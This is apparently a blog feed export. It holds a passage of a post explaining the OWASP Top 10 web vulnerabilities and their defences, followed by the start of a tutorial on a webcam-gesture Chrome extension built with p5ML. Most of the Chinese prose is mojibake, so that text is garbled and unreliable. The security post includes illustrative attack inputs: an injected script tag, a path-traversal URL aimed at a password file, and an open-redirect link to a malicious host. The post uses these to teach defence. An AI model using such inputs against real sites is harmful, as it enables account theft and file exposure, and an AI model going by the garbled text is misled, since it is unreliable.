åŒæ¨£çš„ case å¯ä»¥ apply åˆ°å¾ˆå¤šåœ°æ–¹ã€‚å¦‚æœä½ æŠŠä½¿ç”¨è€…è¼¸å…¥çµ¦ä½ çš„æ±è¥¿åŸå°ä¸å‹•æ‹¿å» run os command line å°±æ˜¯ command injectionã€‚æŠŠ user è¼¸å…¥çµ¦ä½ çš„æ±è¥¿åŸå°ä¸å‹•å¯«é€² log å°±æœƒæœ‰ log injectionã€‚å¾ˆå¤šåˆå‡ºèŒ…å»¬çš„ developer ä¸çŸ¥é“æˆ–æ˜¯å¿˜è¨˜é é˜² injection çš„å•é¡Œï¼Œé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ injection æ˜¯ OWASP å¤šå¹´ä¾†çš„ä¸å‹•æ¦œé¦–ã€‚
SQL Injection é é˜²æœ€åŸºæœ¬çš„ä¸€ä»¶äº‹æƒ…å°±æ˜¯æŠŠä½  web server çš„ error log é—œèµ·ä¾†(ä¸è¦ return çµ¦ client)ã€‚ä¸è¦è®“ä»»ä½•è¨Šæ¯æ´©éœ²ã€‚å¦‚æœä½ æ²’é—œèµ·ä¾†ï¼Œhacker å¤§æ¦‚éš¨ä¾¿è©¦å…©æ¬¡å°±çŸ¥é“ä½ çš„ table name äº†ã€‚
ç„¶å¾Œè¦æ€éº¼é˜²å‘¢ï¼Ÿç•¶ç„¶å°±æ˜¯è¦å¥½å¥½ validate user inputã€‚åœ¨ CS é ˜åŸŸæœ‰å€‹ç”¨ä¾†åš‡åˆå­¸è€…çš„å† å†•å ‚çš‡çš„åè©ï¼Œå«åš parameterized queryã€‚
å…¶å¯¦æ¦‚å¿µä¹Ÿå¾ˆç°¡å–®ï¼Œå°±æ˜¯ä½  server ç«¯å…ˆæŠŠä½ çš„ sql query å¯«å¥½ã€‚è‡³æ–¼ username ä¹‹é¡çš„è®Šæ•¸å‘¢ï¼Ÿå°±ç­‰ validate ä¹‹å¾Œå†ä¸Ÿé€²å»ï¼Œå¥½è™•å°±æ˜¯ code æœ‰ code çš„ syntax è·Ÿå…è¨±çš„ characterï¼Œdata æœ‰ data çš„ syntax è·Ÿå…è¨±çš„ characterï¼Œcode è·Ÿ data åˆ†æ¸…æ¥šä½ ä¹‹å¾Œçš„ test ä¹Ÿæœƒæ¯”è¼ƒå¥½å¯«ã€‚
è‡³æ–¼å„ç¨®èªè¨€æ€éº¼ implement è«‹åƒè€ƒ Query Parameterization Cheat Sheet
A2: Broken Authentication and Session Managementé€™å€‹ category åŒ…å«æ‰€æœ‰çš„ç›œå¸³è™Ÿï¼Œä¸è«–ä½ å¸³å¯†æ˜¯è¢«çŒœåˆ°é‚„æ˜¯è¢«ç«Šè½åˆ°éƒ½ç®—ã€‚
é€™è£¡è¦å…ˆä»‹ç´¹ sessionï¼Œsession å¯ä»¥æŠ½è±¡çš„æƒ³æˆ client è·Ÿ server çš„ä¸€æ¬¡ conversationï¼Œæ¯æ¬¡çš„ conversation é–‹å§‹çš„æ™‚å€™æœƒå…ˆå•å¸³å¯†ï¼Œèªè­‰äº†ä¹‹å¾Œæœƒç”Ÿæˆä¸€å€‹ session idï¼Œä¹Ÿå°±æ˜¯é€™æ¬¡å°è©±çš„ idã€‚åªè¦æ˜¯åŒä¸€å€‹ session id ä½ å°±ä¸éœ€è¦æ¯å‚³ä¸€æ¬¡è¨Šæ¯éƒ½é‡æ–°ç™»å…¥ã€‚
æ‡‚äº†ä¹‹å¾Œå‘¢ï¼Œé–‹å§‹ä»‹ç´¹é€™å€‹é¡å‹çš„å¯èƒ½è¢«æ”»æ“Šçš„é»ã€‚é€™å€‹ category æœ‰å¹¾ç¨®é¡å‹ï¼š
1.å‚³è¼¸æœªåŠ å¯†ï¼Œå‚³è¼¸å…§å®¹è¢«ä¸­é–“äººç«Šè½ã€‚ä¹‹å‰éƒ½æœ‰æéï¼Œè§£æ³•å°±æ˜¯ç”¨ https æˆ– sshã€‚
2.session åœ¨ user ç™»å‡ºä¹‹å¾Œæ²’æœ‰æ¸…ç†æ‰ï¼Œæˆ–æ˜¯ session id ä¸æœƒ time outï¼Œæ›´æ…˜çš„æ˜¯ session id ç›´æ¥å¯«åœ¨ URL è£¡é¢ã€‚æ¯”å¦‚èªªï¼š
http://example.com/myprofile?sessionid=abcde

ä»»ä½•äººåªè¦æ‹¿åˆ°é€™å€‹ session idï¼Œä»–æ ¹æœ¬ä¸ç”¨çŸ¥é“ä½ çš„å¸³å¯†ï¼Œå°±å¯ä»¥ç›´æ¥å‡è£æ˜¯ä½ ï¼ŒæŠŠä½ æˆ¶é ­çš„éŒ¢è½‰èµ°ä¹‹é¡çš„ã€‚
3.å­˜å¯†ç¢¼çš„æ™‚å€™æ²’æœ‰ hash æˆ–æ˜¯ hash çš„æ™‚å€™æ²’æœ‰ add saltã€‚é—œæ–¼è³‡æ–™åº«å¯†ç¢¼å­˜å„²å®‰å…¨å•é¡Œå¯ä»¥åƒè€ƒ ç”¨ä»€éº¼æ¨£çš„å¯†ç¢¼æ¯”è¼ƒå®‰å…¨å‘¢ å¯ä»¥æš´åŠ›ç¡¬ç ´ã€‚
A3: Cross-Site Scripting(XSS)XSS æ˜¯ injection çš„ä¸€ç¨®ã€‚ä¹Ÿå°±æ˜¯ Script injectionã€‚é‚£ç‚ºä»€éº¼è¦å¾ Injection çš„ category å–®ç¨å‡ºä¾†å‘¢ï¼Ÿå› ç‚ºå‰›å‰› A1 è¬›çš„ Injection çš„æ”»æ“Šç›®æ¨™æ˜¯ serverã€‚æ¯”å¦‚ SQL injection çš„ç›®æ¨™æ˜¯ database serverã€command injection çš„ç›®æ¨™æ˜¯ webserver ç­‰ç­‰ã€‚ä½† XSS çš„ç›®æ¨™æ˜¯å…¶ä»–ä½¿ç”¨è€…ã€‚
é‚£è¦æ€éº¼ inject å‘¢ï¼Ÿä¹Ÿæ˜¯å¾ˆç°¡å–®ï¼Œæ¯”å¦‚èªªä¸€å€‹ç¶²ç«™çš„æŸé æœ‰å¾ˆå¤š commentsã€‚æ¯å€‹äººéƒ½å¯ä»¥å¯« commentï¼Œè€Œä¸”å¯«çš„ comment éƒ½æœƒè¢«å…¶ä»–äººçœ‹åˆ°ã€‚ 
é‚£ä»Šå¤©å¦‚æœ hacker ä¹Ÿå¯«äº† commentï¼Œ
I like this post&lt;script&gt;/*Bad code*/&lt;/script&gt;

å› ç‚º webserver æœƒ load æ‰€æœ‰ comment çµ¦æ‰€æœ‰åœ¨ç€è¦½é€™ä¸€é çš„ userï¼Œæ‰€ä»¥é€™å€‹ script å°±æœƒè¢«åŸ·è¡Œã€‚è€Œä¸” user ä¸çŸ¥é“(å› ç‚º html ä¸æœƒ show script tag)ï¼Œé‚£ä½ æƒ³å¾—åˆ°çš„ javascript èƒ½åšçš„äº‹ä»–éƒ½èƒ½åšäº†ï¼Œå· cookieã€session æˆ–æ˜¯è¦†è“‹ä¸€å€‹å‡çš„ login panel åœ¨çœŸçš„ login panel ä¸Šã€‚ä½ å¸³å¯†è¼¸å…¥å®Œå°±ç›´æ¥å‚³åˆ° hacker çš„ server å»ï¼Œå®Œå…¨çœ‹ä¸å‡ºä¾†ï¼Œå› ç‚ºä½  browser çš„ç¶²å€æ˜¯æ­£ç¢ºçš„ã€‚
inject åˆ° HTML element åªæ˜¯å…¶ä¸­ä¸€ç¨®å¯èƒ½ï¼Œä¹Ÿå¯èƒ½ inject åˆ° html tag çš„ attributeï¼Œä¹Ÿå¯ä»¥ inject åˆ° CSSï¼Œä¹Ÿå¯ä»¥inject åˆ°ç¶²ç«™è¦ redirect çš„ URLã€‚
Cross-Site Scripting é é˜²XSS Prevention Cheat Sheetæ´‹æ´‹ç‘ç‘å¯«äº† 7 å€‹ ruleï¼Œä½†å…¶å¯¦ Rule#0 æœ€é‡è¦ã€‚å°±æ˜¯å¥½å¥½ validate æ‰€æœ‰çš„ user inputï¼Œå‰©ä¸‹çš„éƒ½æ˜¯é˜²ç¦¦å„å€‹å¯èƒ½è¢« inject çš„é»çš„å¯¦ä½œç´°ç¯€ã€‚
A4: Insecure Direct Object Referenceå¦‚æœ server ç›´æ¥ç”¨ user çµ¦çš„è®Šæ•¸å» access æª”æ¡ˆï¼Œå°±å¯ä»¥å»çŒœ server å­˜å…¶ä»–æª”æ¡ˆçš„æª”åæˆ–è³‡æ–™å¤¾ï¼Œèˆ‰å€‹ä¾‹å­ï¼š
http://example.com/showimage?image=img1
é€™æ˜¯ç¶²ç«™è¦çµ¦ä½ çœ‹çš„ image1 çš„ linkï¼Œé‚£ä½ æƒ³çœ‹ img2 å°±ç›´æ¥æŠŠå¾Œé¢æ”¹æˆ img2ï¼Œå¦‚æœå¯ä»¥çœ‹å¾—åˆ°é‚£å°±æ˜¯ A4ã€‚
æ›´æ…˜çš„æ˜¯å¦‚æœå…è¨±è¼¸å…¥é€™ç¨®ï¼š
http://example.com/showimage?image=../../password/password.txt
é‚£å°±æ›´ç²¾å½©äº†ã€‚
Insecure Direct Object Reference é é˜²Access control ä¹Ÿå°±æ˜¯æ¯å€‹æª”æ¡ˆçš„å­˜å–æ¬Šé™è¨­å®šå¥½ï¼Œæˆ–æ˜¯æœ€é‡è¦çš„ validate user inputã€‚
A5: Security Misconfigurationåƒæ˜¯ä½ å®‰è£ä¸€å€‹ databaseï¼Œæœƒæœ‰ default çš„å¸³å¯†æ¯”å¦‚èªª user: adminï¼Œå¯†ç¢¼: admin ä½ æ²’æœ‰æŠŠå®ƒæ‹¿æ‰ï¼Œæˆ–æ˜¯ server error çš„æ™‚å€™ä½ æŠŠæ‰€æœ‰ error message å…¨éƒ¨å‚³çµ¦clientã€‚
Security Misconfiguration è§£æ³•
èªçœŸçœ‹docã€‚

æ‰€æœ‰æª”æ¡ˆç­‰ç­‰çš„æ¬Šé™éƒ½é–‹åˆ°æœ€ä½ï¼Œä¸éœ€è¦çš„ port éƒ½é—œæ‰ï¼Œåªæä¾›éœ€è¦æä¾›çš„æ±è¥¿ã€‚


A6: Sensitive Data Exposureå‚³è¼¸æœªåŠ å¯†æˆ–å¯†ç¢¼æ²’æœ‰ç”¨ hash æˆ–æ²’æœ‰åŠ  saltï¼šè€å•é¡Œ
A7: Missing Function Level Access Controlç¶²é æ²’æœ‰åšå¥½ access controlï¼Œæ¯”å¦‚èªªä¸€äº› webserver çš„ default pathï¼š
&#x2F;log
&#x2F;phpmyadmin 
&#x2F;adminç­‰ç­‰ï¼Œé€™äº›æ¬Šé™æ²’é—œå°±å±¬æ–¼é€™é¡ã€‚
æœ‰æ²’æœ‰é–‹å§‹è¦ºå¾—éƒ½å¤§åŒå°ç•°äº†ã€‚
A8: Cross Site Request Forgeryé€™å€‹æ¯”è¼ƒæœ‰åï¼Œæˆ‘è¦ºå¾—æ’åœ¨ A8 ç®—æ˜¯ä½ä¼°å®ƒäº†ï¼Œå› ç‚ºé€šå¸¸é€™å€‹æ”»æ“Šå¦‚æœæˆåŠŸäº†ï¼Œå‚·å®³æœƒæ¯”è¼ƒå·¨å¤§ã€‚
åŸºæœ¬ä¸Šæˆ‘å€‘è·Ÿ server èƒ½åšçš„äº’å‹•ï¼Œå–æ±ºæ–¼ server é–‹æ”¾çµ¦æˆ‘å€‘çš„æ¬Šé™ã€‚æ¯”å¦‚èªª A å¯ä»¥è½‰éŒ¢åˆ°åˆ¥äººä¿¡ç®±ï¼Œå¯æ˜¯ä¸èƒ½æ”¹ B çš„å¯†ç¢¼ï¼Œä¹Ÿä¸èƒ½æŠŠ C çš„éŒ¢è½‰çµ¦è‡ªå·±ã€‚
å¯æ˜¯ä»Šå¤©è¦æ˜¯æœ‰æ¬Šé™çš„è©±å°±ä¸ä¸€æ¨£äº†ï¼Œä»€éº¼æ™‚å€™æœƒæœ‰æ¬Šé™å‘¢ï¼Ÿå°±æ˜¯ä½ çš„ cookie&#x2F;session é‚„æœ‰æ•ˆçš„æ™‚å€™(æ¯”å¦‚ä½ ç¾åœ¨é–‹ facebook ä¸ç”¨è¼¸å…¥å¯†ç¢¼ï¼Œå› ç‚ºä½  cookie é‚„æœ‰æ•ˆ)ï¼Œè®“ä½ åœ¨ä½ ä¸çŸ¥æƒ…çš„æƒ…æ³ä¸‹é€ http requestã€‚
é€™å°±æ˜¯ä½ å¾ˆå¸¸æ”¶åˆ°åƒåœ¾éƒµä»¶æˆ–æƒ¡æ„éƒµä»¶çš„æ™‚å€™ï¼Œä»–éƒ½æœƒè¦ä½ é»å€‹ linkï¼Œé‚£çµ•ä¸æ˜¯åªæ˜¯è¦ä½ é»å»£å‘Šè¡æµé‡è€Œå·²ã€‚å¦‚æœä½ é»äº†ï¼Œå‰›å¥½ä½ å¦å¤–ä¸€å€‹ç¶²ç«™(æ¯”å¦‚éŠ€è¡Œ)çš„ cookie æ²’æœ‰åˆ°æœŸï¼Œä»–å°±å¯ä»¥å‡è£æ˜¯ä½ ï¼Œé€ http requestã€‚
CSRF è§£æ³•
ä¸€å€‹ request éä¾†å‰å…ˆçœ‹ä¸€ä¸‹ä»–çš„ headerï¼Œå…ˆçœ‹ Origin çš„å€¼è·Ÿç¾åœ¨é€™å€‹ç¶²é çš„ç¶²å€æˆ– Domain ä¸€ä¸ä¸€æ¨£ï¼Œæ²’æœ‰ Origin å€¼å°±çœ‹ Refererå€¼ã€‚ä¸ä¸€æ¨£çš„è©±å°±å¾ˆå¯èƒ½æ˜¯CSRFã€‚

å°æ–¼é get çš„é‡è¦ requestï¼Œè¦æ±‚æä¾›é©—è­‰ç¢¼ï¼Œæˆ–æ˜¯é‡æ–°é©—è­‰ä½¿ç”¨è€…ã€‚


A9: Using Components with Known Vulnerabilitieså°±æ˜¯ä½ ç”¨äº†ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹è»Ÿé«”ï¼Œæ˜æ˜ä»–å€‘å·²ç¶“æ‰¿èªæœ‰å•é¡Œäº†ä½ é‚„ä¸æ›æˆ–ä¸æ›´æ–°ï¼Œå°±æœƒè¢«æ”»æ“Šã€‚
A10: Unvalidated Redirects and Forwardsæœ‰äº› request æœƒæŠŠä½¿ç”¨è€…å°åˆ°å…¶ä»–ç¶²ç«™æˆ–é é¢ï¼Œä»–ç›´æ¥æŠ“å–ç¶²å€çš„ url çš„ parameter ä¾† redirectï¼Œå°±å¾ˆå¥½è¢«æ”»æ“Šã€‚å› ç‚ºä»»ä½•äººéƒ½å¯ä»¥ fake http request è£¡çš„ parameterã€‚æ¯”å¦‚èªªå¦‚æœä½ çš„ç¶²ç«™æœ‰ä¸€å€‹æœƒè‡ªå‹• redirect çš„ codeï¼š
response.sendRedirect(request.getParameter(&quot;url&quot;));

é‚£ hacker å°±å¯ä»¥ç”Ÿä¸€å€‹è¶…é€£çµçµ¦ä½ çš„ä½¿ç”¨è€…ã€‚
http://example.com/example.php?url=http://malicious.example.com
ä½ çš„ä½¿ç”¨è€…çœ‹åˆ°ç¶²å€å‰é¢ï¼Œé¸æ“‡ä¿¡ä»»ä½ ã€‚ä½†æ˜¯ä½ å»æŠŠä»–å°åˆ°æƒ¡æ„ç¶²ç«™ï¼Œèº«æ•—åè£‚ã€‚
Unvalidated Redirects and Forwards è§£æ³•å°±æ˜¯ä¹–ä¹– validateï¼Œä¸ç„¶å°±ä¸è¦ redirectã€‚
ç¸½çµåšå­¸å•æœ€é‡è¦çš„å°±æ˜¯ç¸½çµï¼Œç•°ä¸­æ±‚åŒï¼ŒåŒä¸­æ±‚ç•°ã€‚
A1 A4 A7 A10: user çš„ input å¯èƒ½æ˜¯æƒ¡æ„çš„ï¼Œç¶²å€äº‚æ‰“ã€æª”æ¡ˆäº‚å­˜å–ç­‰ç­‰ã€‚
A2 A6: å¯†ç¢¼å­¸æ²’å­¸å¥½ã€‚
A3 A8: å·å·æ‹¿ä½ çš„ cookie&#x2F;session åšå£äº‹ã€‚
A5 A9: ä¹–ä¹–çœ‹ doc ä¹–ä¹–æ›´æ–°ã€‚
æˆ‘èªç‚ºé€™ä¸»é¡Œçš„æŠ•è³‡å ±é…¬ç‡å¯¦åœ¨æ˜¯æŒºé«˜çš„ï¼Œå› ç‚ºé‡è¦çš„å•é¡Œéƒ½æ˜¯æ›æ¹¯ä¸æ›è—¥ï¼Œå³ä½¿ä¹‹å¾Œæœƒå‡ºæ–°çš„top10ä¹Ÿå¤§æ¦‚å°±æ˜¯é€™åé …å†äº¤æ›é †åºã€‚å¦‚æœæœ‰å¹¾é …æ²’è½éï¼Œç¸½è¦ºå¾—è·Ÿäººå®¶èŠå¤©æ­ä¸ä¸Šè©±ï¼Œæ‰‹è…³ä¸å¥½æ–½å±•ã€‚é€™ç¯‡æ–‡ç« çš„éƒ½çœ‹æ‡‚å°±å¤ äº†ï¼ŒçœŸçš„æœ‰éœ€è¦å¯« server çš„æ™‚å€™ä½ å†å»æ·±å…¥ç ”ç©¶ç´°ç¯€å³å¯ã€‚
å»¶ä¼¸é–±è®€
ç¶²è·¯å®‰å…¨(1) - åŸºç¤å¯†ç¢¼å­¸
ç”¨ä»€éº¼æ¨£çš„å¯†ç¢¼æ¯”è¼ƒå®‰å…¨å‘¢

é—œæ–¼ä½œè€…ï¼š@jyt0532 å¾Œç«¯å·¥ç¨‹å¸«ï¼Œå–œæ­¡å­¸ç¿’æ–°çŸ¥æŒ‘æˆ°æ–°äº‹ç‰©ï¼Œæœ€è¿‘è¦ºå¾— Anti pattern æ¯” Design pattern æœ‰è¶£ã€‚
]]></content>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>å‰ç«¯ä¹Ÿèƒ½ç© Deep learning - ä»¥ p5-deeplearn-js ç‚ºä¾‹</title>
    <url>/2018/01/13/p5ML-deeplearnjs/</url>
    <content><![CDATA[å‰è¨€é‚„è¨˜å¾—ç´„è«æ˜¯ 2012 å¹´æˆ‘é‚„åœ¨å”¸ç ”ç©¶æ‰€çš„æ™‚å€™ï¼Œæœ‰ä½æ¸…å¤§æ•™æˆï¼ˆåŸè«’æˆ‘å¿˜äº†æ˜¯å“ªä½â€¦ï¼‰ä¾†ç³»ä¸Šæ¼”è¬›é—œæ–¼é¡ç¥ç¶“ç¶²è·¯çš„æ‡‰ç”¨ï¼Œç•¶æ™‚çš„æˆ‘è½å¾—éœ§ç…ç…ï¼Œè¦ºå¾—æ˜¯é›¢æˆ‘å¾ˆé™é çš„ä¸€é–€å­¸å•ï¼Œè€Œå¦‚ä»Š Machine Learningã€Deep Learning æ»¿å¤©é£›ï¼Œèªªä½ æ²’è½é KNN å°±åƒèªªä½ æ²’èƒŒé 99 ä¹˜æ³•è¡¨ä¸€æ¨£é©šäººã€‚
å°æ–¼ä¸€å€‹æˆå¤©åœ¨ç¶²é æ‰“æ»¾çš„å‰ç«¯å·¥ç¨‹å¸«ï¼Œå¯èƒ½çœŸçš„æ²’å¤ªå¤šæ©Ÿæœƒç¢°è§¸åˆ°ç›¸é—œå¯¦ä½œæˆ–ç ”ç©¶ã€‚ä½†å°å¿ƒäº†ï¼AI çš„è§¸è§’ä¹Ÿæ…¢æ…¢ä¼¸åˆ°å‰ç«¯çš„é ˜åŸŸ - Screenshot to code in Kerasï¼Œå¾åœ–ç‰‡å°±èƒ½è½‰æˆ HTMLï¼Œä»¥å¾Œè©²æ€éº¼è¾¦å•Šâ€¦
ä½ å¯èƒ½æœƒæƒ³ï¼Œèº«è™•æ–¼è®ŠåŒ–å¿«é€Ÿçš„å‰ç«¯é ˜åŸŸï¼Œæˆ‘å€‘æœ€æ“…é•·çš„ä¸å°±æ˜¯å¿«é€Ÿå­¸ç¿’æ‡‰å°å—ï¼Ÿç¾åœ¨å·²ç¶“æœ‰å¾ˆå¤š js ç‰ˆæœ¬çš„æ©Ÿå™¨å­¸ç¿’å‡½å¼åº«å•¦ï¼Œåƒæ˜¯ Keras.jsã€Deeplearn.js ç­‰ç­‰ï¼Œè®“ä½ å¯ä»¥åœ¨ browser ä¸Šé€é WebGL çš„å¹«åŠ©ä¾†ä½¿ç”¨ GPU åšé‹ç®—ã€‚
ä½†æ˜¯é€™äº› Library çš„å®—æ—¨æ¯”è¼ƒæ˜¯æ‹“å±•æ©Ÿå™¨å­¸ç¿’çš„æ‡‰ç”¨å±¤é¢ï¼Œå°æ–¼æ²’æ¥è§¸é Deeplearning çš„å‰ç«¯å·¥ç¨‹å¸«ä¾†èªªï¼Œè¦åšå‡º teachablemachine é€™æ¨£çš„æ±è¥¿ï¼Œå…¶å¯¦æ²’é€™éº¼ç°¡å–®ã€‚
è€Œä»Šå¤©è¦ä»‹ç´¹çš„é€™æ¬¾ library å°±æ˜¯æƒ³æä¾›ä¸€å€‹ Higher level çš„ js libraryï¼Œé™ä½æ¡ç”¨ Machine learning å¯¦ä½œç”¢å“çš„é–€æª»ã€‚
å…ˆä¾†çœ‹å€‹ Demoï¼š

Demo è£¡æ˜¯ä¸€å€‹ç°¡å–®çš„ Chrome extensionï¼Œé€é WebCam æ“·å–åœ–ç‰‡ä¾†åˆ†æï¼Œåˆ©ç”¨ KNN image classifier modelï¼Œä¾†åˆ¤æ–·å‡ºä¸åŒå‹•ä½œï¼Œä¸¦å°æ‡‰åˆ°ç¶²é ä¸Šçš„äº’å‹•ï¼Œåƒæ˜¯ scroll dow, scroll up æˆ–æ˜¯ä¿®æ”¹ DOM å…ƒä»¶ï¼ˆ Demo ä¸­çš„é–‹é—œç‡ˆæ•ˆæœ ï¼‰ã€‚ä¸»è¦åƒè€ƒè‡ª deeplearn-chrome_extensionã€‚
æ²’æœ‰ï¼Œæˆ‘çš„å¦ä¸€éš»æ‰‹çµ•å°æ²’æœ‰åœ¨ä¸‹é¢æ§åˆ¶æ»‘é¼ ã€‚
é€™ä¸€åˆ‡çš„å¯¦ç¾éƒ½æ˜¯ä¾é  p5ML èˆ‡ deeplearnjs çš„ knn image classifierã€‚
p5MLp5ML é‚„æŒçºŒåœ¨é–‹ç™¼ä¸­ï¼Œä¸»è¦æ˜¯æä¾›ä¸€ç³»åˆ—çš„ API wrapperï¼Œè®“ä½ èƒ½å¿½ç•¥æ‰ä¸€äº›ç›´æ¥ä½¿ç”¨ deeplearn.js éœ€è¦çŸ¥é“çš„ç´°ç¯€ï¼Œåƒæ˜¯ NDArrayMath, Scalar, Array3D ç­‰ deeplearn æä¾›çš„ç‰©ä»¶ã€‚
ä½¿ç”¨æ–¹å¼å¾ˆç°¡å–®ï¼Œç›´æ¥åœ¨ html ä¸­è¼‰å…¥ï¼š
 &lt;script src=&quot;p5ML.min.js&quot;&gt;&lt;/script&gt;
 æˆ–æ˜¯ npm install p5ML --save ä¸‹è¼‰çš†å¯ã€‚
p5ML.min.js æœƒ expose ä¸€å€‹ p5ml çš„å…¨åŸŸè®Šæ•¸ï¼Œè£¡é¢æä¾›ä»¥ä¸‹å¹¾ç¨®ç›®å‰å¯¦ä½œçš„ Modal æ¼”ç®—æ³•ï¼š

LSTM
æ²’ç ”ç©¶é LSTM çš„è®€è€…å¯ä»¥çœ‹çœ‹é€™ç¯‡ä»‹ç´¹ï¼ŒLSTMç›´è§€ç†è§£


ImageNet - ç›®å‰åªæ”¯æ´ SqueezeNet Modal
SqueezeNet æ¨¡å‹è©³è§£


KNNImage
å…¶ä¸­æ¡ç”¨äº† Deeplearn.js çš„ knn modelsï¼Œå¯«å¾—å¾ˆç°¡æ½”ï¼Œåˆæ˜¯ Typescriptï¼Œå°æ–¼ç†è§£é€™ç¨®æ¼”ç®—æ³•å¾ˆæœ‰å¹«åŠ©ã€‚


NeuralNetwork

é™¤äº† Neura Network å¤–ï¼Œä¸Šè¿°å…¶é¤˜æ¯å€‹ Modal åœ¨ p5ML çš„ github ä¸Šéƒ½æœ‰å°æ‡‰çš„ Demoï¼Œä»¥åŠç°¡çŸ­çš„ä½¿ç”¨æ–¹å¼ã€‚
å¯¦ä½œç¯„ä¾‹ä»¥å‰›å‰›é–‹é ­çœ‹åˆ°çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘ä½¿ç”¨åˆ°çš„æ˜¯ KNNImgae é€™å€‹ APIï¼š
let knn = new p5ml.KNNImageClassifier(callback);
å»ºç«‹å‡º KNNImageClassifier çš„ç‰©ä»¶ knn å¾Œï¼Œæˆ‘å€‘å¯ä»¥é€é knn.addImage(video, index); ä¾†åŠ å…¥ exampleï¼ˆvideo è®Šæ•¸)ï¼Œä¸¦å‘ŠçŸ¥å…¶ class é¡åˆ¥ï¼ˆindex è®Šæ•¸ï¼‰ã€‚ç•¶åŠ å…¥çš„ example è¶³å¤ å¤šä»¥å¾Œï¼Œå°±èƒ½é€é knn.predict(input, callback) ä¾†é æ¸¬ input æ˜¯å±¬æ–¼å“ªç¨®é¡åˆ¥ï¼š
knn.predict(video, function(data) &#123;    if (data.classIndex == 1) &#123;        // å±¬æ–¼é¡åˆ¥ 1    &#125;&#125;);

ä½¿ç”¨èµ·ä¾†å°±æ˜¯é€™éº¼ç°¡å–®ã€‚
æ•´åˆ Extension - popup.jsè¦æ•´åˆåˆ° Chrome extension ä¸­çš„è©±ï¼Œéœ€è¦ä½¿ç”¨åˆ°çš„æ˜¯ popup.js, popup.html, content.js ä»¥åŠ option.htmlã€‚
ç–‘ï¼Ÿç‚ºä»€éº¼éœ€è¦ option.htmlï¼Ÿé€™æ¬¡çš„ç¯„ä¾‹æ‡‰è©²é‚„ç”¨ä¸è‘—éœ€è¦ä½¿ç”¨è€…è¨­å®šä»€éº¼åƒæ•¸å§ï¼Ÿ
åŸå› æ˜¯ç‚ºäº†å–å¾—ä½¿ç”¨è€…çš„æ”å½±æ©Ÿæ¬Šé™ã€‚
ä¸€èˆ¬ Web ä¸Šæ˜¯å‘¼å« navigator.mediaDevices.getUserMedia(options, callback)ä¾†å–å¾—ä½¿ç”¨è€… WebCam æ¬Šé™ï¼š
navigator.mediaDevices.getUserMedia(&#123; audio: true, video: true &#125;, function() &#123;  console.log(&#x27;ok&#x27;);&#125;, function(e) &#123;  console.log(&#x27;webcam not ok&#x27;);&#125;);
ä½†è¦è®“ Chrome extension ä¹Ÿæ‹¿åˆ°æ¬Šé™çš„è©±ï¼Œä½ çš„é€™æ®µç¨‹å¼ç¢¼ï¼Œå¿…é ˆæ”¾ç½®åœ¨ç”± extension æœ¬èº«é–‹å•Ÿçš„ html å…§æ‰å¯ä»¥ï¼Œpopup.html ä¸ç®—ã€‚å› æ­¤ï¼Œåˆ©ç”¨è¨­ç½®é é¢ option.html æ˜¯æœ€ç‚ºé©åˆçš„ï¼Œåªè¦åœ¨ä½ çš„ manifest.json ä¸­è¨­å®šï¼š
manifest.json&quot;options_ui&quot;: &#123;    &quot;page&quot;: &quot;options.html&quot;,    &quot;chrome_style&quot;: true,    &quot;open_in_tab&quot;: true&#125;

ä¹‹å¾Œå°±èƒ½é€éé–‹å•Ÿ Extension çš„è¨­å®šé é¢ï¼Œä¾†å¾µæ±‚ä½¿ç”¨è€…çš„æ”å½±æ¬Šé™ã€‚


å–å¾—æ¬Šé™å¾Œï¼Œåœ¨æˆ‘å€‘çš„ popup.html ä¸­è¦ç¹ªè£½ä¸€äº›é é¢å…ƒä»¶ï¼Œä»¥ä¾›ä¹‹å¾Œæˆ‘å€‘åœ¨å‰ç«¯é€²è¡Œ Image çš„åˆ†é¡ï¼š
&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;video crossorigin=&quot;anonymous&quot; width=&quot;227&quot; height=&quot;227&quot; id=&quot;video&quot;&gt;&lt;/video&gt;  &lt;button id=&quot;still&quot;&gt;Do nothing&lt;/button&gt;  &lt;button id=&quot;up&quot;&gt;Up&lt;/button&gt;  &lt;button id=&quot;down&quot;&gt;Down&lt;/button&gt;  &lt;button id=&quot;turnoff&quot;&gt;Turn Off Light&lt;/button&gt;  &lt;script src=&quot;scripts/p5ml.js&quot;&gt;&lt;/script&gt;  &lt;script src=&quot;scripts/popup.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;

popup.js ä¸­å‰‡æ˜¯æ”¾å…¥æœ€ä¸»è¦çš„ knn ç›¸é—œç¨‹å¼ç¢¼ï¼š
popup.jslet knn = new p5ml.KNNImageClassifier(modelLoaded);let turnoffButton = document.getElementById(&#x27;turnoff&#x27;);// turnoffButtonturnoffButton.addEventListener(&#x27;click&#x27;, function () &#123;    knn.addImage(video, 4);    times++;&#125;)setInterval(function() &#123;    if (times &gt; 10) &#123;        knn.predict(video, function(data) &#123;            if (data.classIndex == 1) &#123;                console.log(&#x27;response&#x27;, &#x27;still&#x27;);            &#125; else if (data.classIndex == 2) &#123;                // ...            &#125; else if (data.classIndex == 3) &#123;                // ...            &#125; else if (data.classIndex == 4) &#123;                chrome.runtime.sendMessage(&#123; direction: &quot;turn off&quot; &#125;, function (response) &#123;                console.log(&#x27;response&#x27;, &#x27;turn off&#x27;);                &#125;);            &#125;        &#125;);    &#125;&#125;, 1500);

Line 1 æˆ‘å€‘åˆå§‹åŒ– p5ml.KNNImageClassifier ç‰©ä»¶ knnï¼Œæ¥è‘—åœ¨ turnoffButton æŒ‰ä¸‹æ™‚åŠ å…¥ç¯„ä¾‹ knn.addImage(video, 4)ï¼Œä¸¦è¨­å®šè©²ç¯„ä¾‹é¡åˆ¥ç‚º 4ã€‚
æ¥è‘—åœ¨ Line 8 é–‹å§‹ï¼Œåˆ©ç”¨ setInterval() ä¸æ–·çš„é€²è¡Œ knn.predict()ï¼Œé€™æ¨£å°±èƒ½ç›¡é‡å³æ™‚åˆ†è¾¨ WebCam å‚³ä¾†çš„è³‡æ–™ã€‚
